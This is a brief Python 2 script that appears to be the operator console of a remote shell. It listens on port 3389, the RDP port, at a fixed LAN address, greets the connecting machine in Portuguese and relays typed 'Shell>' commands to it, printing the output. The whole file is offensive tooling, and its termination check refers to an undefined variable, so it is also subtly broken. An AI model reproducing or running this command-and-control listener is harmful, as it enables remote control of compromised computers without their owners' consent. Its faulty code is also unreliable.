#!/usr/bin/python

import socket 

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("192.168.1.4", 3389))
	s.listen(1)
	conn, addr = s.accept()
	print '[+] Seja bem vindo a: ', addr

	while True:

		cmd = raw_input ("Shell> ")

		if 'terminate' in command:
			conn.send('terminate')
			conn.close()
			break

		else:
			conn.send(cmd)
			print conn.recv(1024)
def main ():
    connect ()
main ()
